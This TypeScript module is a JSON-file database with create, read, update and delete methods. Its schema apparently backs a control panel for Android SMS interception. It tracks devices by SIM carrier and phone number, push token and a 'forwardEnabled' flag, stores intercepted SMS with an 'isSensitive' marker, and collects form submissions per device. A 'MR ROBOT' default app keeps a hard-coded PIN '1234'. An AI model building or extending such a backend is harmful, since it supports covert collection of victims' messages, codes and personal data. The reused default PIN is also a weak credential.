import { existsSync, mkdirSync, readFileSync, writeFileSync } from "fs";
import { dirname, resolve } from "path";
import { randomUUID } from "crypto";

export type AppRow = {
  id: number;
  appId: string;
  name: string;
  pin: string;
  status: string;
  createdAt: string;
};

export type DeviceRow = {
  id: number;
  deviceId: string;
  appId: string;
  userId: string;
  name: string;
  androidVersion: number;
  sim1Carrier: string | null;
  sim1Phone: string | null;
  sim2Carrier: string | null;
  sim2Phone: string | null;
  status: string;
  lastOnline: string | null;
  forwardEnabled: boolean;
  fcmToken: string | null;
  installedAt: string;
  updatedAt: string;
};

export type MessageRow = {
  id: number;
  appId: string;
  deviceId: string;
  userId: string;
  fromSender: string;
  fromNumber: string;
  body: string;
  isSensitive: boolean;
  receivedAt: string;
};

export type FormDataRow = {
  id: number;
  appId: string;
  deviceId: string;
  data: Record<string, unknown>;
  submittedAt: string;
};

type DataFile = {
  apps: AppRow[];
  devices: DeviceRow[];
  messages: MessageRow[];
  formData: FormDataRow[];
  meta: { nextAppId: number; nextDeviceId: number; nextMessageId: number; nextFormDataId: number };
};

export const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
export const DEFAULT_APP_NAME = "MR ROBOT";
export const DEFAULT_APP_PIN = "1234";

function makeDefaultApp(): AppRow {
  return {
    id: 1,
    appId: DEFAULT_APP_ID,
    name: DEFAULT_APP_NAME,
    pin: DEFAULT_APP_PIN,
    status: "active",
    createdAt: new Date().toISOString(),
  };
}

const DEFAULT_APP: AppRow = makeDefaultApp();

function dbFilePath(): string {
  return resolve(process.env.LOCAL_DB_FILE ?? resolve(process.cwd(), "data", "local-db.json"));
}

function emptyData(): DataFile {
  return {
    apps: [makeDefaultApp()],
    devices: [],
    messages: [],
    formData: [],
    meta: { nextAppId: 2, nextDeviceId: 1, nextMessageId: 1, nextFormDataId: 1 },
  };
}

class LocalDb {
  private data: DataFile;
  private readonly file: string;

  constructor() {
    this.file = dbFilePath();
    this.data = this.load();
  }

  private load(): DataFile {
    if (!existsSync(this.file)) {
      const initial = emptyData();
      this.save(initial);
      return initial;
    }
    try {
      const parsed = JSON.parse(readFileSync(this.file, "utf8")) as Partial<DataFile>;
      const normalized = this.normalizeData(parsed);
      this.save(normalized);
      return normalized;
    } catch {
      const backup = `${this.file}.broken-${Date.now()}-${randomUUID()}`;
      try { writeFileSync(backup, readFileSync(this.file)); } catch {}
      const initial = emptyData();
      this.save(initial);
      return initial;
    }
  }

  private normalizeData(parsed: Partial<DataFile>): DataFile {
    const apps = [...(parsed.apps ?? [])];
    const defaultIndex = apps.findIndex((a) => a.appId === DEFAULT_APP_ID);

    if (defaultIndex === -1) {
      apps.unshift(makeDefaultApp());
    } else {
      // Keep the demo app visible in Master Admin even if older data had it disabled/renamed.
      apps[defaultIndex] = {
        ...apps[defaultIndex],
        appId: DEFAULT_APP_ID,
        name: apps[defaultIndex].name || DEFAULT_APP_NAME,
        pin: apps[defaultIndex].pin || DEFAULT_APP_PIN,
        status: "active",
        createdAt: apps[defaultIndex].createdAt || new Date().toISOString(),
      };
    }

    const maxAppId = apps.reduce((max, app) => Math.max(max, Number(app.id) || 0), 1);

    return {
      apps,
      devices: parsed.devices ?? [],
      messages: parsed.messages ?? [],
      formData: parsed.formData ?? [],
      meta: {
        nextAppId: Math.max(parsed.meta?.nextAppId ?? 0, maxAppId + 1),
        nextDeviceId: parsed.meta?.nextDeviceId ?? ((parsed.devices?.length ?? 0) + 1),
        nextMessageId: parsed.meta?.nextMessageId ?? ((parsed.messages?.length ?? 0) + 1),
        nextFormDataId: parsed.meta?.nextFormDataId ?? ((parsed.formData?.length ?? 0) + 1),
      },
    };
  }

  private save(data = this.data): void {
    mkdirSync(dirname(this.file), { recursive: true });
    writeFileSync(this.file, JSON.stringify(data, null, 2));
  }

  listApps(): AppRow[] { return [...this.data.apps].sort((a, b) => a.createdAt.localeCompare(b.createdAt)); }
  getApp(appId: string): AppRow | undefined { return this.data.apps.find((a) => a.appId === appId); }
  createApp(input: { appId: string; name: string; pin?: string; status?: string }): AppRow {
    if (this.getApp(input.appId)) throw new Error("APP_EXISTS");
    const row: AppRow = { id: this.data.meta.nextAppId++, appId: input.appId, name: input.name, pin: input.pin ?? "1234", status: input.status ?? "active", createdAt: new Date().toISOString() };
    this.data.apps.push(row); this.save(); return row;
  }
  updateApp(appId: string, updates: Partial<Pick<AppRow, "name" | "pin" | "status">>): AppRow | undefined {
    const app = this.getApp(appId); if (!app) return undefined;
    if (updates.name !== undefined) app.name = updates.name;
    if (updates.pin !== undefined) app.pin = updates.pin;
    if (updates.status !== undefined) app.status = updates.status;
    this.save(); return app;
  }
  deleteApp(appId: string): AppRow | undefined {
    const idx = this.data.apps.findIndex((a) => a.appId === appId); if (idx < 0) return undefined;
    const [row] = this.data.apps.splice(idx, 1); this.save(); return row;
  }

  listDevices(filter: { appId?: string; userId?: string } = {}): DeviceRow[] {
    return this.data.devices.filter((d) => filter.appId ? d.appId === filter.appId : filter.userId ? d.userId === filter.userId : true);
  }
  getDevice(deviceId: string): DeviceRow | undefined { return this.data.devices.find((d) => d.deviceId === deviceId); }
  upsertDevice(input: Omit<DeviceRow, "id" | "installedAt" | "updatedAt">): { row: DeviceRow; created: boolean } {
    const now = new Date().toISOString();
    const existing = this.getDevice(input.deviceId);
    if (existing) {
      Object.assign(existing, input, { updatedAt: now });
      this.save(); return { row: existing, created: false };
    }
    const row: DeviceRow = { ...input, id: this.data.meta.nextDeviceId++, installedAt: now, updatedAt: now };
    this.data.devices.push(row); this.save(); return { row, created: true };
  }
  updateDevice(deviceId: string, updates: Partial<DeviceRow>): DeviceRow | undefined {
    const row = this.getDevice(deviceId); if (!row) return undefined;
    Object.assign(row, updates, { updatedAt: new Date().toISOString() });
    this.save(); return row;
  }

  listMessages(filter: { appId?: string; userId?: string; deviceId?: string } = {}): MessageRow[] {
    return this.data.messages
      .filter((m) => filter.appId ? m.appId === filter.appId : filter.userId ? m.userId === filter.userId : filter.deviceId ? m.deviceId === filter.deviceId : true)
      .sort((a, b) => b.receivedAt.localeCompare(a.receivedAt));
  }
  createMessage(input: Omit<MessageRow, "id" | "receivedAt"> & { receivedAt?: string }): MessageRow {
    const row: MessageRow = { ...input, id: this.data.meta.nextMessageId++, receivedAt: input.receivedAt ?? new Date().toISOString() };
    this.data.messages.push(row); this.save(); return row;
  }

  listFormData(filter: { appId: string; deviceId?: string }): FormDataRow[] {
    return this.data.formData
      .filter((f) => f.appId === filter.appId && (!filter.deviceId || f.deviceId === filter.deviceId))
      .sort((a, b) => b.submittedAt.localeCompare(a.submittedAt));
  }
  createFormData(input: Omit<FormDataRow, "id" | "submittedAt">): FormDataRow {
    const row: FormDataRow = { ...input, id: this.data.meta.nextFormDataId++, submittedAt: new Date().toISOString() };
    this.data.formData.push(row); this.save(); return row;
  }
  deleteFormData(id: number): FormDataRow | undefined {
    const idx = this.data.formData.findIndex((f) => f.id === id); if (idx < 0) return undefined;
    const [row] = this.data.formData.splice(idx, 1); this.save(); return row;
  }

  stats(appId?: string): Record<string, number> {
    return appId ? {
      devices: this.data.devices.filter((d) => d.appId === appId).length,
      messages: this.data.messages.filter((m) => m.appId === appId).length,
      formData: this.data.formData.filter((f) => f.appId === appId).length,
    } : {
      apps: this.data.apps.length,
      devices: this.data.devices.length,
      messages: this.data.messages.length,
      formData: this.data.formData.length,
    };
  }

  sample(appId?: string): Record<string, unknown> {
    if (appId) return {
      devices: this.data.devices.find((d) => d.appId === appId) ?? null,
      messages: this.data.messages.find((m) => m.appId === appId) ?? null,
      formData: this.data.formData.find((f) => f.appId === appId) ?? null,
    };
    return {
      apps: this.data.apps[0] ?? null,
      devices: this.data.devices[0] ?? null,
      messages: this.data.messages[0] ?? null,
      formData: this.data.formData[0] ?? null,
    };
  }
}

export const localDb = new LocalDb();
